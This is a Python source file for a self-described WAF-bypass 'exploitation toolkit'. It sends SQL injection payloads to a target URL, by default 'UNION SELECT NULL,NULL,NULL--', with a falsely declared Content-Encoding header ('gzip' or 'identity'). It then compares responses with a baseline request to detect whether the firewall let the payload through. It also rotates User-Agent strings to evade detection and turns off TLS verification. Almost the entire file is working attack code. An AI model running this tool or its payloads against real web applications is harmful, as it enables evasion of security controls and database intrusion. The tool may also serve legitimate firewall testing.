# Name: ACED & IBTD Exploitation Toolkit
# Version: 1.0.0
# Description: Research-driven WAF bypass tool targeting protocol-level logic asymmetry.
# Author: QA210 (Discord: quynhanhh_11)
# License: MIT
#!/usr/bin/env python3
import requests
import argparse
import random
import json
import sys

# --- Configuration & Data ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
]

def print_banner():
    print(r"""
   ___   __  __ _      ____   ____    _   __   _____
  / _ | / / / /| | /| / / /  / __/   / | / /  / ___/
 / __ |/ /_/ / | |/ |/ / /__/ _/    /  |/ /  / /__  
/_/ |_|\____/  |__/|__/____/___/   /_/|_/   \____/  
                                                     
            [ACED & IBTD Research PoC v1.0]
    Features: Random UA, Auto-Compare, JSON Support
    """)

def get_headers(random_ua, content_type):
    """Generates headers with optional random User-Agent."""
    headers = {
        "Accept": "*/*",
        "Connection": "close"
    }
    
    if random_ua:
        headers["User-Agent"] = random.choice(USER_AGENTS)
    else:
        headers["User-Agent"] = "Mozilla/5.0 (Compatible; PoC-Scanner/1.0)"
        
    headers["Content-Type"] = content_type
    return headers

def construct_body(payload, use_json, json_key="id"):
    """Constructs the request body based on format (Raw or JSON)."""
    if use_json:
        try:
            # Attempt to parse payload as valid JSON string first, 
            # otherwise wrap it in the specified key.
            # Example: payload="1' OR 1=1--" -> {"id": "1' OR 1=1--"}
            return json.dumps({json_key: payload})
        except Exception:
            return payload
    return payload

def send_request(url, headers, body, verbose=False):
    """Sends HTTP request and returns response object."""
    try:
        response = requests.post(url, data=body, headers=headers, verify=False, timeout=5)
        return response
    except Exception as e:
        if verbose:
            print(f"[-] Network Error: {e}")
        return None

def analyze_results(baseline_resp, attack_resp, mode_name):
    """Compares baseline and attack responses to determine bypass status."""
    print("\n" + "="*60)
    print(f"[ANALYSIS] Result for {mode_name}")
    print("="*60)
    
    if not baseline_resp or not attack_resp:
        print("[!] Error: One or more requests failed.")
        return

    base_len = len(baseline_resp.content)
    att_len = len(attack_resp.content)

    print(f"{'Request Type':<20} | {'Status':<10} | {'Length (Bytes)':<15}")
    print("-" * 60)
    print(f"{'Baseline (Normal)':<20} | {baseline_resp.status_code:<10} | {base_len:<15}")
    print(f"{'Attack (Evasion)':<20} | {attack_resp.status_code:<10} | {att_len:<15}")
    print("-" * 60)

    # Heuristic Analysis
    if base_len == att_len:
        print("[+] POTENTIAL BYPASS DETECTED!")
        print("    Reason: Response length matches baseline exactly.")
        print("    WAF likely forwarded the malicious payload to the backend.")
    elif att_len > base_len:
        print("[-] LIKELY BLOCKED OR ERROR.")
        print("    Reason: Attack response is longer than baseline.")
        print("    This often indicates a WAF block page or a server error (500).")
    else: 
        # att_len < base_len
        # This can happen if Baseline was a DB Error (long) and Attack was a 403 (short)
        # OR Baseline was 200 OK (long) and Attack was 403 (short).
        # We need to check content similarity to be sure.
        if baseline_resp.status_code == attack_resp.status_code:
             print("[?] INCONCLUSIVE.")
             print("    Reason: Status codes match but lengths differ.")
             print("    Possible difference in dynamic content (e.g., timestamps).")
        else:
            print("[-] LIKELY BLOCKED.")
            print(f"    Reason: Status code changed from {baseline_resp.status_code} to {attack_resp.status_code}.")

    # Preview Snippets
    print("\n[Content Preview]")
    print(f"Baseline Body (First 100 chars): {baseline_resp.text[:100]}")
    print(f"Attack Body (First 100 chars):   {attack_resp.text[:100]}")
    print("="*60 + "\n")

def run_scan_mode(url, payload, mode, use_json, json_key, random_ua):
    """Executes the logic: Baseline -> Attack -> Compare."""
    content_type = "application/json" if use_json else "application/x-www-form-urlencoded"
    
    # 1. BASELINE REQUEST (Normal behavior)
    # No Content-Encoding header (or implicit identity) to get a standard response
    print(f"[*] Step 1: Sending Baseline Request to {url}...")
    baseline_headers = get_headers(random_ua, content_type)
    baseline_body = construct_body(payload, use_json, json_key)
    baseline_resp = send_request(url, baseline_headers, baseline_body)

    # 2. ATTACK REQUEST (ACED or IBTD)
    print(f"[*] Step 2: Sending {mode.upper()} Attack Vector...")
    attack_headers = get_headers(random_ua, content_type)
    attack_body = baseline_body # Same body content
    
    if mode == 'aced':
        attack_headers["Content-Encoding"] = "gzip" # The Deception
        print("    [Header] Content-Encoding: gzip")
    elif mode == 'ibtd':
        attack_headers["Content-Encoding"] = "identity" # The Transparency
        print("    [Header] Content-Encoding: identity")

    attack_resp = send_request(url, attack_headers, attack_body)

    # 3. COMPARE
    if baseline_resp and attack_resp:
        analyze_results(baseline_resp, attack_resp, mode.upper())
    else:
        print("[-] Scan failed due to network errors.")

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="Advanced WAF Logic Asymmetry Exploitation Toolkit")
    
    # Core Arguments
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://target.com/api/login)")
    parser.add_argument("-p", "--payload", default="id=1' UNION SELECT NULL,NULL,NULL--", help="Payload to inject. For JSON, this is the value.")
    parser.add_argument("-m", "--mode", choices=['aced', 'ibtd'], required=True, help="Attack mode: aced or ibtd")
    
    # Feature Arguments
    parser.add_argument("--json", action="store_true", help="Send payload as JSON body (Content-Type: application/json)")
    parser.add_argument("--json-key", default="id", help="Key name for JSON payload (default: 'id')")
    parser.add_argument("--random-ua", action="store_true", default=True, help="Use random User-Agent (Default: Enabled)")
    parser.add_argument("--no-random-ua", action="store_true", help="Disable random User-Agent")

    args = parser.parse_args()

    # Handle UA logic
    use_random_ua = args.random_ua and not args.no_random_ua

    # Clean payload if it looks like a query string for JSON mode
    # e.g., if payload is "id=1'..." and mode is JSON, we strip "id=" to avoid {"id": "id=1'..."}
    if args.json and "=" in args.payload:
        # Heuristic: take the part after the first '='
        clean_payload = args.payload.split('=', 1)[1]
        print(f"[!] JSON mode enabled. Auto-extracted value from payload string: '{clean_payload}'")
        args.payload = clean_payload

    run_scan_mode(
        url=args.url,
        payload=args.payload,
        mode=args.mode,
        use_json=args.json,
        json_key=args.json_key,
        random_ua=use_random_ua
    )

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    main()

